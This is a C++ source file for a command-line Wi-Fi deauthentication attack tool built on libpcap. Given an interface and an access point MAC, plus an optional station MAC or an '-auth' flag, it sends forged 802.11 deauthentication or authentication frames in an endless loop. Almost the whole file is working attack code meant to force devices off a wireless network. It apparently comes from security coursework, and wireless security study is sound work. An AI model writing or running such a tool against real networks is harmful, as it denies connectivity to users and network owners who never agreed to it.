#include <pcap.h>
#include <iostream>
#include <cstdio>
#include <unistd.h>
#include "802-11.h"

using namespace std;

#define BROADCAST 1
#define UNICAST 2
#define AUTH 3

int mod;
char* dev = nullptr;
Mac ap;
Mac station;
deau_packet packet;

bool parse(int argc, char* argv[]) {
    if (argc == 3) {
        mod = BROADCAST;
        dev = argv[1];
        ap = string(argv[2]);
    }
    else if (argc == 4) {
        mod = UNICAST;
        dev = argv[1];
        ap = string(argv[2]);
        station = string(argv[3]);
    }
    else if (argc == 5 && (string(argv[4]) == "-auth")) {
        mod = AUTH;
        dev = argv[1];
        ap = string(argv[2]);
        station = string(argv[3]);
    }
    else {
        return false;
    }
    return true;
}

void usage(void) {
    cout << "deauth-attack <interface> <ap mac> [<station mac> [-auth]]" << '\n';
    cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << '\n';
}

void send_packet(pcap_t* handle) {
    if(mod == BROADCAST) {
        packet.deauth_init();
        packet.set(Mac::broadcastMac(), ap, ap);
    }

    else if(mod == UNICAST) {

        packet.deauth_init();
        packet.set(ap, station, ap);
    }
    //mod==AUTH
    else{
        packet.auth_init();
        packet.set(station, ap, ap);
    }
    while(1) {
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s \n", res, pcap_geterr(handle));
                return;
            }
            sleep(0.5);
        }
}


int main(int argc, char* argv[]) {
    if(parse(argc, argv) == 0) {
        usage();
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
        return -1;
    }
    send_packet(handle);
    pcap_close(handle);
    return 0;
}